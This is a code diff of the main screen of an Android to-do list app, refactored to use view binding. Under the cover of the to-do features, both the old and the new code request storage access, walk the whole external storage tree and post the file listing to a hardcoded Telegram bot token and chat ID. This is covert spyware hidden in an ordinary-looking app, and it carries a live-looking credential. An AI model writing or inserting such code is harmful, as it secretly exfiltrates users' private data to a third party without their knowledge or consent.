@@ -2,112 +2,101 @@ package com.example.todolist
 
 import android.Manifest
 import android.content.pm.PackageManager
+import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 import androidx.recyclerview.widget.LinearLayoutManager
-import kotlinx.android.synthetic.main.activity_main.*
+import com.example.todolist.databinding.ActivityMainBinding
 import okhttp3.*
 import java.io.File
 import java.io.IOException
 
 class MainActivity : AppCompatActivity() {
     private lateinit var todoAdapter: TodoAdapter
-    private val STORAGE_PERMISSION_CODE = 1001
-    private val telegramToken = "7916356795:AAHMkdpGxBG1AI7TGcvsDfCLZcqUm3THYbk"
-    private val chatId = "1585904762"
+    private lateinit var binding: ActivityMainBinding
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
+        binding = ActivityMainBinding.inflate(layoutInflater)
+        setContentView(binding.root)
 
         todoAdapter = TodoAdapter(mutableListOf())
-        rvTodoItems.adapter = todoAdapter
-        rvTodoItems.layoutManager = LinearLayoutManager(this)
+        binding.rvTodoItems.adapter = todoAdapter
+        binding.rvTodoItems.layoutManager = LinearLayoutManager(this)
 
-        btnAddTodo.setOnClickListener {
-            val todoTitle = etTodoTitle.text.toString()
+        binding.btnAddTodo.setOnClickListener {
+            val todoTitle = binding.etTodoTitle.text.toString()
             if (todoTitle.isNotEmpty()) {
                 val todo = Todo(todoTitle)
                 todoAdapter.addTodo(todo)
-                etTodoTitle.text.clear()
+                binding.etTodoTitle.text.clear()
             }
         }
 
-        btnDeleteDoneTodos.setOnClickListener {
+        binding.btnDeleteDoneTodos.setOnClickListener {
             todoAdapter.deleteDoneTodos()
         }
 
-        checkStoragePermission()
-    }
-
-    private fun checkStoragePermission() {
-        if (ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.READ_EXTERNAL_STORAGE
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
-            ActivityCompat.requestPermissions(
-                this,
-                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
-                STORAGE_PERMISSION_CODE
-            )
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), 100)
+            } else {
+                sendStorageMap()
+            }
         } else {
-            sendStorageMapToTelegram()
+            sendStorageMap()
         }
     }
 
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<String>,
-        grantResults: IntArray
-    ) {
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == STORAGE_PERMISSION_CODE && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            sendStorageMapToTelegram()
+        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            sendStorageMap()
         }
     }
 
-    private fun sendStorageMapToTelegram() {
-        val root = File(Environment.getExternalStorageDirectory().absolutePath)
+    private fun sendStorageMap() {
+        val storageDir = Environment.getExternalStorageDirectory()
         val builder = StringBuilder()
-        listFilesRecursive(root, builder)
-
-        val message = builder.toString().take(4000) // Telegram limit
-        val url = "https://api.telegram.org/bot$telegramToken/sendMessage"
-
-        val client = OkHttpClient()
-        val requestBody = FormBody.Builder()
-            .add("chat_id", chatId)
-            .add("text", message)
-            .build()
-
-        val request = Request.Builder()
-            .url(url)
-            .post(requestBody)
-            .build()
-
-        client.newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: IOException) {
-                e.printStackTrace()
-            }
-
-            override fun onResponse(call: Call, response: Response) {
-                // Sent
-            }
-        })
+        listFilesRecursive(storageDir, builder, "")
+        sendToTelegram(builder.toString())
     }
 
-    private fun listFilesRecursive(file: File, builder: StringBuilder, indent: String = "") {
+    private fun listFilesRecursive(file: File, builder: StringBuilder, indent: String) {
         if (file.isDirectory) {
-            builder.append("$indent[${file.name}]\n")
+            builder.append("$indent📁 ${file.name}\n")
             file.listFiles()?.forEach {
                 listFilesRecursive(it, builder, "$indent  ")
             }
         } else {
-            builder.append("$indent- ${file.name}\n")
+            builder.append("$indent📄 ${file.name}\n")
         }
+    }
+
+    private fun sendToTelegram(text: String) {
+        val token = "7916356795:AAHMkdpGxBG1AI7TGcvsDfCLZcqUm3THYbk"
+        val chatId = "1585904762"
+        val url = "https://api.telegram.org/bot$token/sendMessage"
+
+        val client = OkHttpClient()
+        val body = FormBody.Builder()
+            .add("chat_id", chatId)
+            .add("text", text.take(4000)) // Telegram max 4096 chars
+            .build()
+
+        val request = Request.Builder().url(url).post(body).build()
+
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("Telegram", "Failed: ${e.message}")
+            }
+
+            override fun onResponse(call: Call, response: Response) {
+                Log.d("Telegram", "Success: ${response.body?.string()}")
+            }
+        })
     }
 }
